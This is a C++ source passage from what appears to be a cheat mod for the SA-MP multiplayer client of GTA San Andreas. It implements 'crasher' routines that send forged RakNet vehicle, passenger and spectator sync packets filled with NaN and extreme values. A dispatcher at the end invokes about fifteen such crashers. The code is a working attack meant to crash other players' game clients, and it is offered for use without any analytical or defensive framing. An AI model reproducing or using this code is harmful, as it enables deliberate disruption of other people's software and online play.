					g_RakClient->SendFakeUnoccupiedSyncData(VehicleID, 0, fCrasherPos, vehicle->speed, vehicle->hitpoints, fSoundCrasherValue, fRoll);
					g_RakClient->SendExitPlayerVehicle(VehicleID);
				}
			}
			tick = now_tick;
		}
	}
}
void C_QuarterCrasher()
{
	if (cheat_state->crasher.iQuarterCrasher)
	{
		struct actor_info* ainfo = actor_info_get(ACTOR_SELF, NULL);
		if (!ainfo)
			return;
		vehicle_info* vehicle =
			GetVehicleInfoForceFlags(
				VEHICLE_NOT_OCCUPIED |
				VEHICLE_NEXT |
				VEHICLE_NOT_MY |
				VEHICLE_ALIVE);
		if (!vehicle)
			return;
		int VehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
		static DWORD dwRunDelay = 200;
		if (cheat_state->state == CHEAT_STATE_VEHICLE)
		{/*
sendPassenger(carId, true)
sendSpectator(posX, posY, posZ)

vehicle_sync
data.carId = carId
data.quaternion[1] = onSendSpec.data.quaternion[1]
data.quaternion[2] = onSendSpec.data.quaternion[2]
data.moveSpeed.x = -15861.589912
		 */
			if (GetTickCount() - dwRunDelay > 200)
			{
				float fVehPos[3];
				vect3_copy(&vehicle->base.matrix[12], fVehPos);
				g_RakClient->SendFakePassengerSyncData(VehicleID, fVehPos, vehicle->hitpoints, g_Players->pLocalPlayer->passengerData.byteCurrentWeapon,1);
				stSpectatorData specSync;
				ZeroMemory(&specSync, sizeof(stSpectatorData));
				specSync.fPosition[0] = fVehPos[0];
				specSync.fPosition[1] = fVehPos[1];
				specSync.fPosition[2] = fVehPos[2];
				RakNet::BitStream bsSpectatorSync;
				RakNet::BitStream bsVehicleSync;
				bsSpectatorSync.Write((BYTE)ID_SPECTATOR_SYNC);
				bsSpectatorSync.Write((PCHAR)&specSync, sizeof(stSpectatorData));
				g_RakClient->Send(&bsSpectatorSync);
				stInCarData inCarSync;
				ZeroMemory(&inCarSync, sizeof(stInCarData));
				inCarSync.sVehicleID = VehicleID;
				/*inCarSync.fPosition[0] = fVehPos[0];
				inCarSync.fPosition[1] = fVehPos[1];
				inCarSync.fPosition[2] = fVehPos[2];*/
				inCarSync.fQuaternion[1] = specSync.fQuaternion[1];
				inCarSync.fQuaternion[2] = specSync.fQuaternion[2];
				inCarSync.fMoveSpeed[0] = -15861.589912;
				bsVehicleSync.Write((BYTE)ID_VEHICLE_SYNC);
				bsVehicleSync.Write((PCHAR)&inCarSync, sizeof(stInCarData));
				g_RakClient->Send(&bsVehicleSync);
				dwRunDelay = GetTickCount();
			}
		}
	}
}
void C_RollCrasher3()
{
	if (cheat_state->crasher.iRollCrasher3)
	{
		static DWORD tick = 200;
		DWORD now_tick = GetTickCount();
		if (KEY_DOWN(VK_LBUTTON))
		{
			actor_info* self = actor_info_get(ACTOR_SELF, NULL);
			if (!self)
				return;

			vehicle_info* vehicle =
				GetVehicleInfoStandart(
					VEHICLE_NOT_OCCUPIED |
					VEHICLE_NOT_CLOSED,
					VEHICLE_CLOSEST |
					VEHICLE_NOT_MY |
					VEHICLE_ALIVE |
					VEHICLE_NOT_TRAIN);

			if (!vehicle)
				return;

			float fPos[3];
			float fRoll[3] = { NAN, NAN, NAN };
			float fDirection[3] = { -NAN,-9999999.0f,-9999999.0f, };
			vect3_copy(&self->base.matrix[12], fPos);
			/*	vehicle->base.matrix[4 * 1 + 1];
				vehicle->base.matrix[4 * 1 - 1];*/
				//fPos[0] += 5.0;
			int iVehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);
			if (GetTickCount() - tick > 350)
			{
				g_RakClient->SendEnterPlayerVehicle(iVehicleID, 0);
				g_RakClient->SendFullFakeUnoccupiedFuckingSyncData(iVehicleID, 0, fDirection, fPos,vehicle->speed, vehicle->hitpoints, vehicle->spin, fRoll);
				cheat_state_text("Roll val: %0.2f | Direction val: %0.2f", fRoll[0],fDirection[2]);
				g_RakClient->SendExitPlayerVehicle(iVehicleID);
				tick = now_tick;
			}

		}
	}
}
void Crashers(void)
{
	C_PassengerCrasher();
	C_RemovePlayerCrasher();
	C_InvalidBulletsCrasher1();
	C_InvalidBulletsCrasher2();
	C_InvalidBulletsCrasher3();
	C_InvalidBulletsCrasher4();
	CCrasher();
	C_TuningCrasher();
	C_HighfRollCrasher();
	C_RollCrasher2();
	C_RollCrasher3();
	C_DirectionCrasher1();
	C_DirectionCrasher2();
	GameSoundCrasher();
};
#endif